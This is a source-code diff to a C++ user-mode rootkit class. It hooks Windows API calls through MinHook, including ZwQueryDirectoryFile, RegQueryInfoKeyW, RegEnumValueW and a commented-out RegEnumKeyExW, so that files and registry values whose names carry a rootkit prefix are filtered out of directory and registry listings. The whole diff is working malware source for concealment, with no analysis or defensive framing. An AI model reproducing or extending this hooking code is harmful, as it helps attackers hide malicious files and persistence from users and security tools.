@@ -4,6 +4,7 @@ Rootkit::NtQuerySystemInformation Rootkit::OriginalNtQuerySystemInformation;
 Rootkit::ZwQueryDirectoryFile Rootkit::OriginalZwQueryDirectoryFile;
 Rootkit::RegQueryInfoKeyW Rootkit::OriginalRegQueryInfoKeyW;
 Rootkit::RegEnumValueW Rootkit::OriginalRegEnumValueW;
+//Rootkit::RegEnumKeyExW Rootkit::OriginalRegEnumKeyExW;
 
 void Rootkit::Initialize()
 {
@@ -12,9 +13,10 @@ void Rootkit::Initialize()
 	if (sizeof(size_t) == 8) //TODO: Currently unstable on x86 processes!
 	{
 		MH_CreateHookApi(L"ntdll.dll", "ZwQueryDirectoryFile", HookedZwQueryDirectoryFile, (PVOID*)&OriginalZwQueryDirectoryFile);
+		MH_CreateHookApi(L"advapi32.dll", "RegQueryInfoKeyW", HookedRegQueryInfoKeyW, (PVOID*)&OriginalRegQueryInfoKeyW);
+		MH_CreateHookApi(L"advapi32.dll", "RegEnumValueW", HookedRegEnumValueW, (PVOID*)&OriginalRegEnumValueW);
+		//MH_CreateHookApi(L"advapi32.dll", "RegEnumKeyExW", HookedRegEnumKeyExW, (PVOID*)&OriginalRegEnumKeyExW);
 	}
-	MH_CreateHookApi(L"advapi32.dll", "RegQueryInfoKeyW", HookedRegQueryInfoKeyW, (PVOID*)&OriginalRegQueryInfoKeyW);
-	MH_CreateHookApi(L"advapi32.dll", "RegEnumValueW", HookedRegEnumValueW, (PVOID*)&OriginalRegEnumValueW);
 	MH_EnableHook(MH_ALL_HOOKS);
 }
 void Rootkit::DebugLog(wstring str)
@@ -94,6 +96,7 @@ NTSTATUS Rootkit::HookedRegQueryInfoKeyW(HKEY hKey, PWSTR pClass, PDWORD pcClass
 	if (status == ERROR_SUCCESS && pcValues != NULL && *pcValues > 0)
 	{
 		DWORD valueCount = *pcValues;
+		//DWORD subKeyCount = *pcSubKeys;
 		WCHAR name[16383];
 
 		for (DWORD i = 0; i < *pcValues; i++)
@@ -108,18 +111,38 @@ NTSTATUS Rootkit::HookedRegQueryInfoKeyW(HKEY hKey, PWSTR pClass, PDWORD pcClass
 			}
 		}
 
+		//for (DWORD i = 0; i < *pcSubKeys; i++)
+		//{
+		//	DWORD maxLength = 255;
+		//	if (OriginalRegEnumKeyExW(hKey, i, name, &maxLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+		//	{
+		//		if (wstring(name).find(ROOTKIT_PREFIX) == 0)
+		//		{
+		//			subKeyCount--;
+		//		}
+		//	}
+		//}
+
 		*pcValues = valueCount;
+		//*pcSubKeys = subKeyCount;
 	}
 
 	return status;
 }
-NTSTATUS Rootkit::HookedRegEnumValueW(HKEY hKey, DWORD dwIndex, PWSTR pValueName, PDWORD pcchValueName, PDWORD pReserved, PDWORD pType, PBYTE pData, PDWORD pcbData)
+NTSTATUS Rootkit::HookedRegEnumValueW(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
 {
+	WCHAR achClass[MAX_PATH] = L"";
+	DWORD classNameSize = MAX_PATH;
 	DWORD subKeyCount;
+	DWORD maxSubKeySize;
+	DWORD maxClassSize;
 	DWORD valueCount;
+	DWORD maxValueSize;
 	DWORD maxValueDataSize;
+	DWORD securityDescriptor;
+	FILETIME lastWriteTime;
 
-	if (RegistryQueryInfoKey(hKey, subKeyCount, valueCount, maxValueDataSize) && valueCount > 0)
+	if (OriginalRegQueryInfoKeyW(hKey, achClass, &classNameSize, NULL, &subKeyCount, &maxSubKeySize, &maxClassSize, &valueCount, &maxValueSize, &maxValueDataSize, &securityDescriptor, &lastWriteTime) == ERROR_SUCCESS && valueCount > 0)
 	{
 		WCHAR name[16383];
 
@@ -136,8 +159,42 @@ NTSTATUS Rootkit::HookedRegEnumValueW(HKEY hKey, DWORD dwIndex, PWSTR pValueName
 		}
 	}
 
-	return OriginalRegEnumValueW(hKey, dwIndex, pValueName, pcchValueName, pReserved, pType, pData, pcbData);
+	return OriginalRegEnumValueW(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);
 }
+//NTSTATUS Rootkit::HookedRegEnumKeyExW(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcClass, PFILETIME lpftLastWriteTime)
+//{
+//	DebugLog(L"HookedRegEnumKeyExW");
+//	WCHAR achClass[MAX_PATH] = L"";
+//	DWORD classNameSize = MAX_PATH;
+//	DWORD subKeyCount;
+//	DWORD maxSubKeySize;
+//	DWORD maxClassSize;
+//	DWORD valueCount;
+//	DWORD maxValueSize;
+//	DWORD maxValueDataSize;
+//	DWORD securityDescriptor;
+//	FILETIME lastWriteTime;
+//
+//	if (OriginalRegQueryInfoKeyW(hKey, achClass, &classNameSize, NULL, &subKeyCount, &maxSubKeySize, &maxClassSize, &valueCount, &maxValueSize, &maxValueDataSize, &securityDescriptor, &lastWriteTime) == ERROR_SUCCESS && valueCount > 0)
+//	{
+//		WCHAR name[255];
+//
+//		for (DWORD i = 0; i < min(subKeyCount, dwIndex + 1); i++)
+//		{
+//			DWORD maxLength = 255;
+//			if (OriginalRegEnumKeyExW(hKey, i, name, &maxLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+//			{
+//				DebugLog(wstring(name));
+//				if (wstring(name).find(ROOTKIT_PREFIX) == 0)
+//				{
+//					dwIndex++;
+//				}
+//			}
+//		}
+//	}
+//
+//	return OriginalRegEnumKeyExW(hKey, dwIndex, lpName, lpcName, lpReserved, lpClass, lpcClass, lpftLastWriteTime);
+//}
 WCHAR* Rootkit::GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInformationClass)
 {
 	switch (fileInformationClass)
@@ -201,16 +258,4 @@ void Rootkit::SetFileNextEntryOffset(PVOID fileInformation, FileInformationClass
 		((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
 		break;
 	}
-}
-bool Rootkit::RegistryQueryInfoKey(HKEY hKey, DWORD &subKeyCount, DWORD &valueCount, DWORD &maxValueDataSize)
-{
-	WCHAR achClass[MAX_PATH] = L"";
-	DWORD classNameSize = MAX_PATH;
-	DWORD maxSubKeySize;
-	DWORD maxClassSize;
-	DWORD maxValueSize;
-	DWORD securityDescriptor;
-	FILETIME lastWriteTime;
-
-	return OriginalRegQueryInfoKeyW(hKey, achClass, &classNameSize, NULL, &subKeyCount, &maxSubKeySize, &maxClassSize, &valueCount, &maxValueSize, &maxValueDataSize, &securityDescriptor, &lastWriteTime) == ERROR_SUCCESS;
 }
